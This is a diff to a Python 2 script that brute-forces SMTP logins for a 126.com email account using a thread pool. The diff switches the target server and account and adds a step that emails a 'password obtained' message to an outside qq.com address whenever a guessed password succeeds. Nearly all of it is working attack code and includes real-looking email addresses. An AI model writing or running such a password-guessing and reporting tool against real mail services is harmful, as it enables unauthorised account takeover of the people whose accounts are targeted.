@@ -6,6 +6,7 @@
 import threading
 import smtplib
 import Queue
+from email.mime.text import MIMEText
 
 '''
 模塊分析：
@@ -17,6 +18,12 @@ import Queue
 '''
 #zhubokue
 
+msg=MIMEText('这个是获得的密码信息')
+msg['From']='fengchubojue@126.com'
+msg['To']='1064187559@qq.com'
+msg['Subect']='mima'
+
+print msg.as_string()
 
 class threadpool(object):
     def __init__(self,Max_num=100):
@@ -41,14 +48,14 @@ def getemaillist():
 
 def getpass(passwd):
     a = threading.Lock()
-    s=smtplib.SMTP('smtp.163.com')
+    s=smtplib.SMTP('smtp.126.com')
     a.acquire()
     try:
-        s.login('13731250529@126.com',passwd)
+        s.login('fengchubojue@126.com',passwd)
     except smtplib.SMTPAuthenticationError:
         print 'password incorrect'
     else:
-        print passwd
+        s.sendmail('fengchubojue@126.com','1064187559@qq.com',msg.as_string())
     finally:
         thread.add_thread()
         s.close()
